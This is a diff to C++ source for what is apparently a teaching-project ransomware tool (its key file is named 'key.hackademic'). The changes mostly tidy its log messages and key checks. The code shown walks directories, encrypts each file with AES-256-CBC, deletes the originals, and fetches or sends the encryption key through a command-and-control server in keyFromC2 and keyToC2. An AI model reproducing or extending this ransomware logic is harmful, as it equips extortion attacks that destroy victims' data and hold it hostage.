@@ -13,6 +13,10 @@
 #include <openssl/rand.h>
 
 #define BUFFER_SIZE 1024
+#define INFO    "[i] "
+#define ERROR   "[☓] "
+#define OK      "[✓] "
+#define INPUT   "[/] "
 
 
 // CST & DST
@@ -40,7 +44,7 @@ bool AES256CBC::decryptFile(std::filesystem::path path) {
     std::ofstream fout(path.replace_extension(), std::ios::binary);
     // IMPORTANT: path does not have the extension from this point!
     if (!fin or !fout) {
-        cerr() << " └─[☓] Error opening file.\n";
+        cerr() << " └─" << ERROR << "Error opening file.\n";
         return false;
     }
      
@@ -48,7 +52,7 @@ bool AES256CBC::decryptFile(std::filesystem::path path) {
     unsigned char iv[keySize_];
     fin.readsome((char*)iv, keySize_);
     if ( !ctx or !EVP_DecryptInit_ex(ctx, evp_aes256cbc, NULL, key, iv) ) {
-        cerr() << " └─[☓] Error initializing encryption.\n";
+        cerr() << " └─" << ERROR << "Error initializing encryption.\n";
         EVP_CIPHER_CTX_free(ctx);
         return false;
     }
@@ -74,17 +78,20 @@ bool AES256CBC::decryptFile(std::filesystem::path path) {
     fin.close();
     fout.close();
     std::filesystem::remove(path);
-    cout() << " └─[✓] Done.\n";
+    cout() << " └─" << OK << "Done.\n";
     return true;
 }
 
 void AES256CBC::decryptRecursively(const std::filesystem::path& path) {
     //if (!key)  // Do we need this architecture-wise?
     if (!std::filesystem::is_directory(path)) {
-        std::cerr << "Error: not a directory: " << path << "\n";
+        std::cerr << ERROR << "Not a directory: " << path << "\n";
         return;
     }
-    keyFromFile();
+    if (!*key) {
+        cerr() << ERROR << "Key is not present.\n";
+        return;
+    }
     for (const auto &entry : std::filesystem::recursive_directory_iterator(path)) {
         std::filesystem::path filename = entry.path();
         if (filename.extension() == extension_ and std::filesystem::is_regular_file(entry))
@@ -98,7 +105,7 @@ bool AES256CBC::encryptFile(const std::filesystem::path& pathIn) {
     std::ifstream fin(pathIn, std::ios::binary);
     std::ofstream fout(pathOut, std::ios::binary);
     if (!fin or !fout) {
-        cerr() << " └─[☓] Error opening file.\n";
+        cerr() << " └─" << ERROR << "Error opening file.\n";
         return false;
     }
     
@@ -106,7 +113,7 @@ bool AES256CBC::encryptFile(const std::filesystem::path& pathIn) {
     unsigned char iv[keySize_];
     RAND_bytes(iv, keySize_);
     if ( !ctx or !(*iv) or !EVP_EncryptInit_ex(ctx, evp_aes256cbc, NULL, key, iv) ) {
-        cerr() << " └─[☓] Error initializing encryption.\n";
+        cerr() << " └─" << ERROR << "Error initializing encryption.\n";
         EVP_CIPHER_CTX_free(ctx);
         return false;
     }
@@ -128,17 +135,19 @@ bool AES256CBC::encryptFile(const std::filesystem::path& pathIn) {
     fout.close();
     std::filesystem::remove(pathIn);
     EVP_CIPHER_CTX_free(ctx);
-    cout() << " └─[✓] Done.\n";
+    cout() << " └─" << OK << "Done.\n";
     return true;
 }
 
 void AES256CBC::encryptRecursively(const std::filesystem::path& path) {
     if (!std::filesystem::is_directory(path)) {
-        std::cerr << "Error: not a directory: " << path << "\n";
+        cerr() << ERROR << "Not a directory: " << path << "\n";
         return;
     }
-    //if (!key)  // Do we need this architecture-wise?
-    generateKey();
+    if (!*key) {
+        cerr() << ERROR << "Key is not present.\n";
+        return;
+    }
     for (const auto &entry : std::filesystem::recursive_directory_iterator(path)) {
         std::filesystem::path filename = entry.path();
         if (filename.extension() != extension_ and std::filesystem::is_regular_file(entry))
@@ -148,8 +157,7 @@ void AES256CBC::encryptRecursively(const std::filesystem::path& path) {
 
 void AES256CBC::generateKey() {
     RAND_bytes(key, keySize_);
-    cout() << "[i] Generated key.\n";
-    keyToFile();
+    cout() << INFO << "Generated key.\n";
 }
 
 void AES256CBC::keyFromC2(const std::string& id) {
@@ -161,27 +169,26 @@ void AES256CBC::keyFromC2(const std::string& id) {
             std::this_thread::sleep_for(60s); // Would rather have smth like 60std::chrono_literals::s
             continue;
         }
-        cout() << r.text << std::endl;
         if (r.text.empty())
             generateKey();
         else
             std::memcpy(key, r.text.data(), keySize_*sizeof(char));
     }
-    cout() << "[i] Fetched key from C2: " << key << std::endl;
+    cout() << INFO << "Fetched key from C2: " << key << std::endl;
 }
 
 void AES256CBC::keyFromFile() {
     std::string keyPath;
-    std::cout << "[/] Enter a path where to read the key from (default=./key.hackademic): ";
+    std::cout << INPUT << "Enter a path where to read the key from (default=./key.hackademic): ";
     getline(std::cin, keyPath);
     if (keyPath == "")
         keyPath = "./key.hackademic";
     std::ifstream fin(keyPath, std::ios::binary);
     if (!fin)
-        cerr() << " └─[☓] Error opening file.\n";
+        cerr() << " └─" << ERROR << "Error opening file.\n";
     else {
         fin.readsome((char*)key, keySize_);
-        cout() << "[i] Read the key from:  " << keyPath << ".\n";
+        cout() << INFO << "Read the key from:  " << keyPath << ".\n";
     }
 }
 
@@ -200,16 +207,16 @@ void AES256CBC::keyToC2(const std::string& id) {
 
 void AES256CBC::keyToFile() {
     std::string keyPath;
-    std::cout << "[/] Enter a path where to write the key to (default=./key.hackademic): ";
+    std::cout << INPUT << "Enter a path where to write the key to (default=./key.hackademic): ";
     getline(std::cin, keyPath);
     if (keyPath == "")
         keyPath = "./key.hackademic";
     std::ofstream fout(keyPath, std::ios::binary);
     if (!fout)
-        cerr() << " └─[☓] Error opening file.\n";
+        cerr() << " └─" << ERROR << "Error opening file.\n";
     else {
         fout.write((char*)key, keySize_);
-        cout() << "[i] Wrote the key to:  " << keyPath << ".\n";
+        cout() << INFO << "Wrote the key to:  " << keyPath << ".\n";
     }
 }
 
